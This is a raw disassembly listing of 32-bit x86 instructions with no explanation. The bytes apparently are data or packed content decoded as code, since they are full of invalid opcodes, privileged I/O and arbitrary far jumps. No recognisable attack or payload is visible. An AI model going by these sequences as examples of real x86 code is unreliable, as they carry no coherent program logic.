  4118b4:	mov    eax,ds:0x1d29474f
  4118b9:	cmc    
  4118ba:	iret   
  4118bb:	inc    BYTE PTR [ecx-0x75]
  4118be:	shl    BYTE PTR [ecx-0xe],cl
  4118c1:	outs   dx,BYTE PTR ds:[esi]
  4118c2:	std    
  4118c3:	dec    ecx
  4118c4:	sub    BYTE PTR [ebx+0x44],cl
  4118c7:	in     eax,0x68
  4118c9:	and    eax,0x231b318a
  4118ce:	inc    eax
  4118cf:	fwait
  4118d0:	sbb    esp,esi
  4118d2:	pop    ds
  4118d3:	sub    BYTE PTR [eax-0x45],ah
  4118d6:	aas    
  4118d7:	or     al,0x67
  4118d9:	sbb    DWORD PTR [edi+0x15],edi
  4118dc:	jge    0x41193a
  4118de:	retf   
  4118df:	add    BYTE PTR [edx],ch
  4118e1:	shr    BYTE PTR [esi+0x60],cl
  4118e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118e5:	and    BYTE PTR [ecx+0x17a50690],al
  4118eb:	ja     0x411937
  4118ed:	and    eax,0xb1bfc094
  4118f2:	aad    0x6a
  4118f4:	jmpw   0xfd12
  4118f8:	inc    edi
  4118f9:	pusha  
  4118fa:	inc    ebx
  4118fb:	jecxz  0x4118cc
  4118fd:	add    DWORD PTR [eax+0x2a3c01bd],esp
  411903:	or     ah,dh
  411905:	imul   BYTE PTR [ebx+0x59]
  411908:	sub    eax,0x10415e9e
  41190d:	pop    ecx
  41190e:	inc    eax
  41190f:	inc    edi
  411910:	sbb    cl,ah
  411912:	loopne 0x4118c0
  411914:	sub    BYTE PTR [edi+0x40efc6e6],ch
  41191a:	xchg   esi,eax
  41191b:	cwde   
  41191c:	inc    esi
  41191d:	mov    bl,0xc6
  41191f:	scas   al,BYTE PTR es:[edi]
  411920:	test   al,0x62
  411922:	dec    ecx
  411923:	push   ss
  411924:	xchg   esi,eax
  411925:	xchg   esp,eax
  411926:	mov    esi,0x62d3486b
  41192b:	clc    
  41192c:	outs   dx,BYTE PTR ds:[esi]
  41192d:	and    DWORD PTR [esi+0x72],esi
  411930:	adc    al,0x97
  411932:	std    
  411933:	or     al,0x8d
  411935:	jno    0x41194f
  411937:	fld    DWORD PTR [ebx+0x633b4958]
  41193d:	xchg   esi,eax
  41193e:	fmul   QWORD PTR [esi-0x22203b69]
  411944:	dec    esi
  411945:	neg    BYTE PTR [edi]
  411947:	xor    BYTE PTR [edi],ch
  411949:	fs sahf 
  41194b:	stos   DWORD PTR es:[edi],eax
  41194c:	shl    eax,cl
  41194e:	lods   eax,DWORD PTR ds:[esi]
  41194f:	adc    ah,ah
  411951:	push   esp
  411952:	fisubr WORD PTR ds:0xe48536d3
  411958:	push   edi
  411959:	enter  0x2d7a,0xb3
  41195d:	not    DWORD PTR [edx-0x44]
  411960:	xor    eax,0xcb45c73d
  411965:	pop    edi
  411966:	mov    al,ds:0x96948dac
  41196b:	pop    ss
  41196c:	pop    eax
  41196d:	sbb    BYTE PTR [ebx+0x77],0xd1
  411971:	sbb    bh,cl
  411973:	xchg   esi,eax
  411974:	sar    DWORD PTR [ecx],1
  411976:	or     edi,DWORD PTR [esi+0xb031523]
  41197c:	sub    eax,0x698a1998
  411981:	push   ds
  411982:	(bad)  
  411983:	in     eax,dx
  411984:	(bad)  
  411985:	frstor [ebx+0x65]
  411988:	dec    ecx
  411989:	or     al,BYTE PTR [eax-0x7d]
  41198c:	pop    ss
  41198d:	ins    DWORD PTR es:[edi],dx
  41198e:	cdq    
  41198f:	sbb    eax,0xc1a3fdea
  411994:	imul   esi,DWORD PTR [edi*1+0x2d643198],0x246682b4
  41199f:	lea    esi,[edi-0x156f8a8a]
  4119a5:	leave  
  4119a6:	push   edi
  4119a7:	aaa    
  4119a8:	dec    ebx
  4119a9:	add    al,0x58
  4119ab:	addr16 or cl,dl
  4119ae:	jg     0x4119dc
  4119b0:	inc    eax
  4119b1:	icebp  
  4119b2:	je     0x411937
  4119b4:	push   esi
  4119b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119b6:	sub    dl,BYTE PTR [eax]
  4119b8:	xor    eax,0x578ddd09
  4119bd:	enter  0x1796,0xe
  4119c1:	ins    DWORD PTR es:[edi],dx
  4119c2:	xchg   DWORD PTR [esi+0x42],edx
  4119c5:	out    0x96,eax
  4119c7:	xor    BYTE PTR [ebp-0x7c97cb06],dh
  4119cd:	pushf  
  4119ce:	(bad)  
  4119cf:	iret   
  4119d0:	adc    DWORD PTR [ebp+0x7bbbb932],edi
  4119d6:	and    ah,BYTE PTR [eax-0x3e]
  4119d9:	pushf  
  4119da:	fistp  WORD PTR [eax+0x302ee41f]
  4119e0:	jae    0x41196b
  4119e2:	clc    
  4119e3:	jns    0x4119bc
  4119e5:	jno    0x4119e2
  4119e7:	ss inc esi
  4119e9:	adc    al,0xd9
  4119eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119ec:	mov    ebx,0xdf8ac09f
  4119f1:	push   esi
  4119f2:	push   ss
  4119f3:	mov    bl,0xc2
  4119f5:	sbb    eax,0x6336b5b8
  4119fa:	lahf   
  4119fb:	pop    es
  4119fc:	sub    al,0xf
  4119fe:	lods   al,BYTE PTR ds:[esi]
  4119ff:	sbb    DWORD PTR [ebp-0x554aee53],esp
  411a05:	jecxz  0x411a2e
  411a07:	ja     0x4119dc
  411a09:	jo     0x411991
  411a0b:	push   ss
  411a0c:	or     DWORD PTR [edx+0x6ba05e5e],edi
  411a12:	add    DWORD PTR [ecx+edx*4],esp
  411a15:	shr    DWORD PTR [ecx],cl
  411a17:	inc    eax
  411a18:	mov    dh,0xba
  411a1a:	inc    edx
  411a1b:	mov    al,ds:0xe387f3ee
  411a20:	(bad)  
  411a21:	(bad)  
  411a22:	aam    0x3c
  411a24:	inc    edi
  411a25:	stc    
  411a26:	imul   esi,DWORD PTR [edx+0x7e],0x15
  411a2a:	cwde   
  411a2b:	xor    al,0x2f
  411a2d:	xchg   edx,eax
  411a2e:	add    esi,edi
  411a30:	nop
  411a31:	jmp    0x203b:0xed6e34c4
  411a38:	inc    edx
  411a39:	lods   eax,DWORD PTR ds:[esi]
  411a3a:	daa    
  411a3b:	bswap  edi
  411a3d:	test   bl,0x13
  411a40:	jmp    0xfe366070
  411a45:	fwait
  411a46:	mov    ecx,DWORD PTR [edi-0x6d]
  411a49:	jle    0x4119d5
  411a4b:	icebp  
  411a4c:	in     eax,dx
  411a4d:	std    
  411a4e:	xor    esi,DWORD PTR [edx+0x3c]
  411a51:	mov    eax,ds:0xd1382eff
  411a56:	pop    ds
  411a57:	imul   ebp,DWORD PTR [ecx],0x15
  411a5a:	adc    edi,edx
  411a5c:	div    BYTE PTR cs:[ecx]
  411a5f:	icebp  
  411a60:	enter  0x63c,0xc8
  411a64:	push   edi
  411a65:	sub    DWORD PTR [edi+0x7d],0xffffffd7
  411a69:	lods   al,BYTE PTR ds:[esi]
  411a6a:	daa    
  411a6b:	rcr    DWORD PTR [edx+0x25996206],1
  411a71:	(bad)  
  411a73:	sbb    BYTE PTR [ecx],dh
  411a75:	mov    eax,ds:0x23d59717
  411a7a:	push   ss
  411a7b:	mov    bh,0x71
  411a7d:	jae    0x411af3
  411a7f:	jmp    0x11b922f8
  411a84:	ins    DWORD PTR es:[edi],dx
  411a85:	sub    al,0xd2
  411a87:	mov    edx,0xec2fcf21
  411a8c:	xor    ebx,edx
  411a8e:	rcr    DWORD PTR [edi+0x78],cl
  411a91:	mov    esi,DWORD PTR [ecx]
  411a93:	cld    
  411a94:	je     0x411afe
  411a96:	mov    ebx,0x5392de52
  411a9b:	xor    eax,0xa6ff0046
  411aa0:	fs sbb edx,esp
  411aa3:	mov    ds:0xb0b7b805,al
  411aa8:	xlat   BYTE PTR ds:[ebx]
  411aa9:	push   edx
  411aaa:	mov    edx,0x15f45cdf
  411aaf:	pop    es
  411ab0:	or     BYTE PTR [ebp+0x6b],0xbe
  411ab4:	ret    
  411ab5:	jnp    0x411b15
  411ab7:	ficom  DWORD PTR [esi]
  411ab9:	dec    edx
  411aba:	sub    esp,DWORD PTR [ebx-0x7866b025]
  411ac0:	mov    ch,0x77
  411ac2:	cmp    BYTE PTR [ebx+edi*2-0x22],ah
  411ac6:	jecxz  0x411aa3
  411ac8:	and    eax,0x2e92acf8
  411acd:	xor    dh,BYTE PTR [ecx+0x2995eadf]
  411ad3:	xor    BYTE PTR [eax-0x283ba82b],ah
  411ad9:	(bad)  
  411ada:	in     eax,dx
  411adb:	sub    eax,0x85cfa6b1
  411ae0:	outs   dx,BYTE PTR ds:[esi]
  411ae1:	mov    BYTE PTR [edi-0x5de86e9],al
  411ae7:	mov    eax,ds:0xd724801b
  411aec:	ret    
  411aed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aef:	add    edi,DWORD PTR [esi-0x70]
  411af2:	int    0x3e
  411af4:	mov    es,WORD PTR [esi+0x5e]
  411af7:	cmp    ecx,ebp
  411af9:	ret    0x7243
  411afc:	inc    ebp
  411afd:	mov    ebx,0xbe131b7
  411b02:	(bad)  
  411b03:	sbb    BYTE PTR [edx-0x6591cc0f],bh
  411b09:	jp     0x411b35
  411b0b:	and    al,0x37
  411b0d:	dec    ebp
  411b0e:	mov    bl,0xc
  411b10:	pusha  
  411b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b12:	sbb    al,0xc0
  411b14:	or     al,cl
  411b16:	sbb    al,0x33
  411b18:	cld    
  411b19:	dec    esp
  411b1a:	fistp  WORD PTR [edx+eiz*8-0x3f]
  411b1e:	xchg   ecx,eax
  411b1f:	ins    BYTE PTR es:[edi],dx
  411b20:	and    DWORD PTR es:[edi+0x75],ebp
  411b24:	pop    ecx
  411b25:	icebp  
  411b26:	scas   eax,DWORD PTR es:[edi]
  411b27:	xor    BYTE PTR [esi+eiz*4-0x173197c6],0x27
  411b2f:	pop    edi
  411b30:	push   edx
  411b31:	fisttp QWORD PTR [ebp+0xf]
  411b34:	iret   
  411b35:	mov    WORD PTR [ebx+edx*1+0x6d],gs
  411b39:	frstor [esp+esi*8+0x6e014758]
  411b40:	inc    esp
  411b41:	test   eax,0x75fc083e
  411b46:	xchg   ebx,eax
  411b47:	stos   DWORD PTR es:[edi],eax
  411b48:	cmc    
  411b49:	push   esp
  411b4a:	sub    al,0x26
  411b4c:	dec    esi
  411b4d:	pushf  
  411b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b4f:	lds    ecx,FWORD PTR [edx+ebx*1]
  411b52:	adc    DWORD PTR ds:0xff9904a0,edi
  411b58:	adc    esi,ecx
  411b5a:	out    0x13,eax
  411b5c:	push   es
  411b5d:	sub    eax,0xd0ee391d
  411b62:	inc    ebp
  411b63:	inc    esp
  411b64:	jo     0x411b13
  411b66:	sar    dl,0xf4
  411b69:	les    ecx,FWORD PTR [ecx-0x1e4d0149]
  411b6f:	xlat   BYTE PTR ds:[ebx]
  411b70:	jbe    0x411b0e
  411b72:	add    al,0x18
  411b74:	push   0xb74ec1c6
  411b79:	dec    ebx
  411b7a:	daa    
  411b7b:	js     0x411be9
  411b7d:	or     eax,DWORD PTR [eax+edx*4+0x6f4d6ba0]
  411b84:	inc    edi
  411b85:	mov    dl,0xc5
  411b87:	push   ds
  411b88:	xchg   DWORD PTR [edi-0x38e28b14],edx
  411b8e:	lods   eax,DWORD PTR ds:[esi]
  411b8f:	fistp  DWORD PTR [edi]
  411b91:	dec    eax
  411b92:	mov    eax,DWORD PTR ds:0x52ee8413
  411b98:	add    bl,0xac
  411b9b:	(bad)  
  411b9c:	bound  ebp,QWORD PTR [ecx-0x787cb2fa]
  411ba2:	sbb    al,0xd5
  411ba4:	push   0x6a92270a
  411ba9:	dec    esi
  411baa:	loope  0x411bcc
  411bac:	adc    al,bh
  411bae:	out    dx,eax
  411baf:	push   ss
  411bb0:	mov    esp,0x99f1cff9
  411bb5:	mov    al,0x2d
  411bb7:	in     al,0xd0
  411bb9:	iret   
  411bba:	dec    esp
  411bbb:	add    bh,BYTE PTR [esi+eax*4-0x68]
  411bbf:	fstp   DWORD PTR [edx]
  411bc1:	(bad)  
  411bc2:	adc    eax,0x6ade515f
  411bc7:	inc    esi
  411bc8:	sbb    BYTE PTR [ecx-0x9e096ba],bl
  411bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bcf:	mov    ebp,DWORD PTR [esi+0x4aaeb76a]
  411bd5:	cmp    eax,edi
  411bd7:	out    0xe,eax
  411bd9:	or     cl,cl
  411bdb:	js     0x411b69
  411bdd:	push   ss
  411bde:	js     0x411c4e
  411be0:	paddusw mm6,QWORD PTR [ebp+0x40]
  411be4:	mov    bl,0x72
  411be6:	mov    ebp,0x1ccfe242
  411beb:	adc    BYTE PTR [edx],al
  411bed:	in     al,dx
  411bee:	pop    ds
  411bef:	or     eax,0x8541e8d3
  411bf4:	push   edx
  411bf5:	jl     0x411c4d
  411bf7:	test   DWORD PTR [esi+0x28],esp
  411bfa:	adc    al,BYTE PTR [edx]
  411bfc:	push   edx
  411bfd:	aad    0x48
  411bff:	sbb    al,0x35
  411c01:	mov    ds:0xd45b698f,eax
  411c06:	rdpmc  
  411c08:	es inc esi
  411c0a:	sahf   
  411c0b:	lods   al,BYTE PTR ds:[esi]
  411c0c:	adc    edi,DWORD PTR [eax+0x75]
  411c0f:	push   ebx
  411c10:	pop    edi
  411c11:	sbb    DWORD PTR [edx+0x51],0x19f78e39
  411c18:	sti    
  411c19:	ins    DWORD PTR es:[edi],dx
  411c1a:	dec    edi
  411c1b:	inc    esi
  411c1c:	sbb    ch,cl
  411c1e:	inc    ebp
  411c1f:	jb     0x411c4d
  411c21:	(bad)  
  411c22:	jmp    0xe374ac9b
  411c27:	push   ebp
  411c28:	cld    
  411c29:	adc    edx,DWORD PTR [esp+edx*8-0x3e21820b]
  411c30:	and    BYTE PTR [ecx+0x3d475924],cl
  411c36:	in     eax,dx
  411c37:	jp     0x411c30
  411c39:	mov    eax,edi
  411c3b:	adc    BYTE PTR ds:0x91f458c1,bl
  411c41:	std    
  411c42:	dec    edi
  411c43:	jns    0x411be6
  411c45:	adc    DWORD PTR [ebx+edi*1+0x3e],esi
  411c49:	jecxz  0x411c56
  411c4b:	sbb    al,0x90
  411c4d:	cs jns 0x411beb
  411c50:	outs   dx,DWORD PTR ds:[esi]
  411c51:	cwde   
  411c52:	into   
  411c53:	or     edx,ecx
  411c55:	ror    BYTE PTR [edi-0x4],0xef
  411c59:	stos   BYTE PTR es:[edi],al
  411c5a:	in     eax,dx
  411c5b:	fidivr WORD PTR [edi]
  411c5d:	sar    BYTE PTR [esi],1
  411c5f:	adc    BYTE PTR [ebx],al
  411c61:	test   DWORD PTR [ecx],ebx
  411c63:	push   0x7c247514
  411c68:	das    
  411c69:	sub    eax,0xf4ba35a3
  411c6e:	pop    ss
  411c6f:	xchg   ebp,eax
  411c70:	sbb    al,0xf8
  411c72:	loope  0x411c91
  411c74:	(bad)  
  411c75:	lods   al,BYTE PTR ds:[esi]
  411c76:	inc    esi
  411c77:	cmp    esp,DWORD PTR [eax+0x18465c3c]
  411c7d:	leave  
  411c7e:	mov    ch,0xca
  411c80:	pushf  
  411c81:	lahf   
  411c82:	aad    0x16
  411c84:	shr    DWORD PTR [edi+edi*8-0x10],1
  411c88:	mov    edi,0x13182acb
  411c8d:	lahf   
  411c8e:	adc    DWORD PTR [ebp+0x3d53309a],0x3b
  411c95:	leave  
  411c96:	push   cs
  411c97:	sahf   
  411c98:	js     0x411c57
  411c9a:	nop
  411c9b:	cdq    
  411c9c:	call   0x1e49:0x73a82675
  411ca3:	jle    0x411cae
  411ca5:	out    dx,eax
  411ca6:	loope  0x411ced
  411ca8:	mov    bl,BYTE PTR [ebp+0x7a]
  411cab:	and    DWORD PTR [eax+0x1e7456bd],ecx
  411cb1:	and    al,0xda
  411cb3:	cdq    
  411cb4:	pushf  
  411cb5:	cli    
  411cb6:	js     0x411d24
  411cb8:	jmp    0x411cbc
  411cba:	xor    eax,0x18a1a996
  411cbf:	or     al,0x14
  411cc1:	icebp  
  411cc2:	push   ss
  411cc3:	push   esi
  411cc4:	dec    esp
  411cc5:	push   es
  411cc6:	out    0x5,al
  411cc8:	push   eax
  411cc9:	add    DWORD PTR [edi-0x61],ebx
  411ccc:	bound  ebx,QWORD PTR [edx]
  411cce:	xor    edi,DWORD PTR [ecx-0x150ee038]
  411cd4:	push   ds
  411cd5:	je     0x411ccc
  411cd7:	or     eax,0x14ac1817
  411cdc:	push   eax
  411cdd:	cli    
  411cde:	bound  ebx,QWORD PTR [ecx+0xa]
  411ce1:	and    edi,DWORD PTR [edi-0x3e]
  411ce4:	adc    DWORD PTR [ecx+esi*4],edi
  411ce7:	or     dl,BYTE PTR [esi+0x1519e814]
  411ced:	call   0x1f7a010b
  411cf2:	ins    BYTE PTR es:[edi],dx
  411cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cf4:	pushf  
  411cf5:	cmp    cl,BYTE PTR [ebx-0x79]
  411cf8:	js     0x411c86
  411cfa:	cwde   
  411cfb:	out    dx,eax
  411cfc:	push   ecx
  411cfd:	int    0xed
  411cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d00:	lods   ax,WORD PTR ds:[esi]
  411d02:	sub    BYTE PTR [ecx-0x72],0x4c
  411d06:	inc    ebx
  411d07:	and    dx,WORD PTR [esi-0x7715d36e]
  411d0e:	xor    al,0x77
  411d10:	xchg   edx,eax
  411d11:	sub    BYTE PTR [edi+0x53],ah
  411d14:	pop    ds
  411d15:	jmp    0x411d25
  411d17:	jns    0x411d09
  411d19:	sar    DWORD PTR [edi+eax*1-0x4d],0x2
  411d1e:	xrelease xchg DWORD PTR [edi],esi
  411d21:	adc    edi,ebx
  411d23:	iret   
  411d24:	sub    al,0x8f
  411d26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d27:	pop    edi
  411d28:	stos   DWORD PTR es:[edi],eax
  411d29:	outs   dx,DWORD PTR ds:[esi]
  411d2a:	jmp    0x411d95
  411d2c:	jle    0x411d28
  411d2e:	dec    BYTE PTR [esi]
  411d30:	retf   0xc8ac
  411d33:	call   0x1594addb
  411d38:	cmp    dl,BYTE PTR [esi-0x570648c2]
  411d3e:	enter  0xc7bd,0x96
  411d42:	or     esp,0x1070f168
  411d48:	iret   
  411d49:	sub    eax,0x49df6898
  411d4e:	inc    ebx
  411d4f:	dec    ebp
  411d50:	and    BYTE PTR [ebx],dl
  411d52:	pop    edi
  411d53:	dec    eax
  411d54:	xchg   ecx,eax
  411d55:	jne    0x411db1
  411d57:	and    BYTE PTR [esp+ebx*8+0x4c],al
  411d5b:	sub    al,BYTE PTR [edi-0x50]
  411d5e:	mov    al,ds:0xcaebb99e
  411d63:	inc    esp
  411d64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d65:	ins    DWORD PTR es:[edi],dx
  411d66:	in     al,dx
  411d67:	mov    dh,0x9b
  411d69:	into   
  411d6a:	pop    es
  411d6b:	sbb    edi,esi
  411d6d:	jecxz  0x411d55
  411d6f:	pop    esp
  411d70:	xor    esi,esp
  411d72:	in     al,dx
  411d73:	icebp  
  411d74:	cmp    eax,0x5cf611b8
  411d79:	ror    ebp,1
  411d7b:	or     DWORD PTR [ecx],0xfffffffa
  411d7e:	dec    esi
  411d7f:	ins    BYTE PTR es:[edi],dx
  411d80:	dec    eax
  411d81:	js     0x411d18
  411d83:	scas   eax,DWORD PTR es:[edi]
  411d84:	inc    ebx
  411d85:	aam    0x4b
  411d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d88:	jp     0x411df6
  411d8a:	sub    eax,0x4d08397c
  411d8f:	sub    eax,0x67e8d106
  411d94:	sub    al,0x6a
  411d96:	mov    cl,0xf6
  411d98:	repnz repnz (bad) 
  411d9b:	jbe    0x411d70
  411d9d:	cmp    esi,DWORD PTR [ebx+0x60]
  411da0:	jl     0x411d4d
  411da2:	fcom   DWORD PTR [edx+0x16]
  411da5:	xor    eax,0xf063017a
  411daa:	pusha  
  411dab:	xor    eax,0x392e4bc6
  411db0:	add    BYTE PTR [ebp-0x21],ch
  411db3:	jae    0x411d58
  411db5:	mov    WORD PTR [edx-0x16],es
  411db8:	mov    ds:0x9ef33844,eax
  411dbd:	xchg   esi,eax
  411dbe:	into   
  411dbf:	loope  0x411d90
  411dc1:	sti    
  411dc2:	push   eax
  411dc3:	adc    esi,esp
  411dc5:	xchg   edi,eax
  411dc6:	(bad)  
  411dc7:	inc    edi
  411dc8:	lds    ebp,FWORD PTR [ebp-0x61]
  411dcb:	pop    es
  411dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dcd:	inc    ecx
  411dce:	call   0x2d8a543
  411dd3:	sub    al,0x2d
  411dd5:	cli    
  411dd6:	ins    DWORD PTR es:[edi],dx
  411dd7:	loope  0x411da3
  411dd9:	dec    edx
  411dda:	imul   DWORD PTR [ebx]
  411ddc:	int3   
  411ddd:	xor    ah,BYTE PTR [ebx]
  411ddf:	jp     0x411ddc
  411de1:	and    al,BYTE PTR [ecx+ecx*8+0x46a7fd4f]
  411de8:	fld    QWORD PTR [eax+0x9]
  411deb:	fdiv   DWORD PTR [ebx-0x2bc7af07]
  411df1:	cli    
  411df2:	imul   esp,DWORD PTR [ecx-0x226b475],0x3a
  411df9:	dec    ebp
  411dfa:	pop    ds
  411dfb:	xchg   ecx,eax
  411dfc:	adc    edx,eax
  411dfe:	xchg   esi,eax
  411dff:	or     BYTE PTR ds:0x16e73590,bh
  411e05:	ret    0xfb94
  411e08:	push   0x90cc2988
  411e0d:	sar    BYTE PTR [ecx+0x61],cl
  411e10:	std    
  411e11:	gs and ah,0x88
  411e15:	arpl   WORD PTR [ebx],sp
  411e17:	sub    dh,BYTE PTR [ecx+0x65791fbf]
  411e1d:	loope  0x411e39
  411e1f:	loopne 0x411e35
  411e21:	cmp    al,0xc
  411e23:	daa    
  411e24:	aaa    
  411e25:	cs mov dl,0x38
  411e28:	push   es
  411e29:	cld    
  411e2a:	pop    edx
  411e2b:	test   DWORD PTR [edi],eax
  411e2d:	ja     0x411e93
  411e2f:	inc    eax
  411e30:	(bad)  
  411e31:	retf   
  411e32:	xchg   ebx,ecx
  411e34:	(bad)  
  411e36:	cwde   
  411e37:	hlt    
  411e38:	push   esi
  411e39:	cmp    al,0x3f
  411e3b:	jmp    0x411e1c
  411e3d:	add    esi,ebx
  411e3f:	push   edi
  411e40:	frstor [eax]
  411e42:	jbe    0x411e07
  411e44:	mov    esp,0xebc338b
  411e49:	mov    WORD PTR [edi],?
  411e4b:	jmp    0x6bda:0xd13fd7e0
  411e52:	bound  eax,QWORD PTR [ebx]
  411e54:	das    
  411e55:	adc    dl,bh
  411e57:	push   ebx
  411e58:	pop    esi
  411e59:	fadd   DWORD PTR ds:0xead21d50
  411e5f:	or     al,0xed
  411e61:	ror    BYTE PTR ds:0xf4cad8fd,0xb7
  411e68:	cwde   
  411e69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e6a:	push   edx
  411e6b:	mov    eax,ds:0x477ef13a
  411e70:	pop    eax
  411e71:	jl     0x411df4
  411e73:	adc    eax,0xf753ac71
  411e78:	cmp    ecx,eax
  411e7a:	dec    esp
  411e7b:	in     eax,0x20
  411e7d:	push   ebx
  411e7e:	adc    BYTE PTR [ecx-0x4b],cl
  411e81:	cmp    cl,BYTE PTR [esp+edx*1]
  411e84:	fs adc eax,0x4d0d40ad
  411e8a:	add    eax,0xe309b1cd
  411e8f:	dec    ebp
  411e90:	xchg   esp,eax
  411e91:	dec    edx
  411e92:	out    0x83,eax
  411e94:	mov    BYTE PTR [edx+0x14],dh
  411e97:	cwde   
  411e98:	pop    ebx
  411e99:	push   esp
  411e9a:	daa    
  411e9b:	ds or  al,0xcb
  411e9e:	pop    eax
  411e9f:	test   ebp,esp
  411ea1:	mov    ah,0xc2
  411ea3:	fild   DWORD PTR [eax-0x31080ccf]
  411ea9:	cmc    
  411eaa:	push   ss
  411eab:	loope  0x411e3a
  411ead:	pop    ss
  411eae:	jmp    0xfeed6d49
  411eb3:	mov    es,ebx
  411eb5:	sbb    al,0x35
  411eb7:	inc    eax
  411eb8:	(bad)
  411ebb:	mov    esi,0xdb8db618
  411ec0:	jmp    0x411ec2
  411ec2:	int    0xd5
  411ec4:	cmp    eax,0x5eabc200
  411ec9:	adc    al,ch
  411ecb:	cdq    
  411ecc:	cmp    edx,ebp
  411ece:	popa   
  411ecf:	aas    
  411ed0:	out    0x12,al
  411ed2:	pop    edx
  411ed3:	enter  0xc414,0x29
  411ed7:	daa    
  411ed8:	pop    edi
  411ed9:	jge    0x411e78
  411edb:	out    dx,al
  411edc:	or     BYTE PTR [edi+0x234caf8f],bh
  411ee2:	mov    DWORD PTR ds:0x9aa17b1f,edi
  411ee8:	mov    ds:0x621364f9,eax
  411eed:	leave  
  411eee:	inc    eax
  411eef:	scas   al,BYTE PTR es:[edi]
  411ef0:	hlt    
  411ef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ef2:	jecxz  0x411ed5
  411ef4:	fadd   QWORD PTR [esi+0x0]
  411ef7:	jge    0x411f0d
  411ef9:	push   ds
  411efa:	xchg   ecx,eax
  411efb:	les    esi,FWORD PTR [edi-0x351af6c3]
  411f01:	in     al,0xca
  411f03:	xchg   esp,eax
  411f04:	scas   eax,DWORD PTR es:[edi]
  411f05:	pop    ss
  411f06:	cmp    al,0xd3
  411f08:	shr    BYTE PTR [edi+0x2c],cl
  411f0b:	retf   0xbd1b
  411f0e:	push   0xfffffffc
  411f10:	xor    eax,0x1a2ca78f
  411f15:	mov    edi,0xe1078aa6
  411f1a:	mov    bh,0xfc
  411f1c:	outs   dx,DWORD PTR ds:[esi]
  411f1d:	jge    0x411ec4
  411f1f:	mov    edi,0xe7d7d2b7
  411f24:	test   BYTE PTR [edx+0x6a31de4a],bh
  411f2a:	in     al,0xca
  411f2c:	sub    DWORD PTR [ecx-0x5becb646],eax
  411f32:	rol    DWORD PTR [ebx],0xc9
  411f35:	imul   esi,edi,0xe
  411f38:	repz dec edx
  411f3a:	mov    dh,BYTE PTR [ebp-0x46]
  411f3d:	add    esi,DWORD PTR [esi-0x7d]
  411f40:	shr    BYTE PTR ds:0xb9959422,1
  411f46:	push   eax
  411f47:	fld    DWORD PTR cs:[ecx]
  411f4a:	or     eax,DWORD PTR [ecx+edi*2]
  411f4d:	js     0x411f64
  411f4f:	jmp    0xec8ef6ad
  411f54:	inc    esi
  411f55:	cli    
  411f56:	out    dx,al
  411f57:	dec    ebp
  411f58:	outs   dx,DWORD PTR ds:[esi]
  411f59:	pop    eax
  411f5a:	xchg   esp,eax
  411f5b:	xor    esi,DWORD PTR [eax]
  411f5d:	or     eax,0x49e62b6c
  411f62:	add    al,0x8d
  411f64:	test   al,0x35
  411f66:	dec    edx
  411f67:	sub    al,0xd
  411f69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f6a:	dec    edi
  411f6b:	packssdw mm5,QWORD PTR [ebx-0x59d16987]
  411f72:	mov    dh,0x71
  411f74:	jmp    0x9c04:0x42f123eb
  411f7b:	icebp  
  411f7c:	push   cs
  411f7d:	lds    edi,FWORD PTR [edi+0x3c]
  411f80:	xchg   BYTE PTR [esi+0x10f027da],ch
  411f86:	pop    ebx
  411f87:	or     cl,BYTE PTR [eax]
  411f89:	jg     0x411fb7
  411f8b:	mov    esp,0xc1dba353
  411f90:	retf   0x3450
  411f93:	shl    eax,0xd0
  411f96:	sub    eax,0x24ac81b5
  411f9b:	mov    al,0xcc
  411f9d:	leave  
  411f9e:	mov    ecx,0x4e6eee35
  411fa3:	jle    0x411f7e
  411fa5:	rcl    BYTE PTR [ebx+0x1d],cl
  411fa8:	sub    DWORD PTR [bp+si],ebx
  411fab:	mov    esp,0xca51ba97
  411fb0:	push   cs
  411fb1:	enter  0x8adb,0xc4
  411fb5:	xor    DWORD PTR [ebp-0x3e9c2e3b],0xb0eae9b6
  411fbf:	mov    ebp,DWORD PTR [ebx+eiz*4+0x56fd262e]
  411fc6:	dec    ecx
  411fc7:	push   ebx
  411fc8:	mov    BYTE PTR [ebp-0x4f9b37b3],ch
  411fce:	call   0xdf36:0xec61ab70
  411fd5:	mov    DWORD PTR [eax-0x55d4698c],ebx
  411fdb:	push   edi
  411fdc:	adc    al,0x50
  411fde:	sub    al,0x46
  411fe0:	aad    0xdb
  411fe2:	test   eax,0x1866330d
  411fe7:	add    edi,DWORD PTR [eax+0x46addf76]
  411fed:	scas   eax,DWORD PTR es:[edi]
  411fee:	inc    ebx
  411fef:	inc    esp
  411ff0:	shl    BYTE PTR [edx],1
  411ff2:	(bad)  
  411ff3:	sub    edi,edx
  411ff5:	sub    eax,0xbe5db157
  411ffa:	mov    ?,WORD PTR [ebx-0x27]
  411ffd:	or     eax,ebx
  411fff:	and    ebp,DWORD PTR [esi-0x42]
  412002:	sbb    DWORD PTR ds:[ecx+0x54fef5fb],eax
  412009:	push   ebx
  41200a:	xchg   ebp,eax
  41200b:	mov    ebx,0x3d01d214
  412010:	mov    cl,0x9e
  412012:	stos   BYTE PTR es:[edi],al
  412013:	push   edi
  412014:	sub    DWORD PTR [ebp+0x4af4d654],0x6844574d
  41201e:	push   esi
  41201f:	xchg   ebx,eax
  412020:	mov    ah,0x74
  412022:	xchg   edx,eax
  412023:	push   ebp
  412024:	jo     0x412092
  412026:	sbb    eax,0xc817cd59
  41202b:	fld    QWORD PTR [ecx-0x14]
  41202e:	int3   
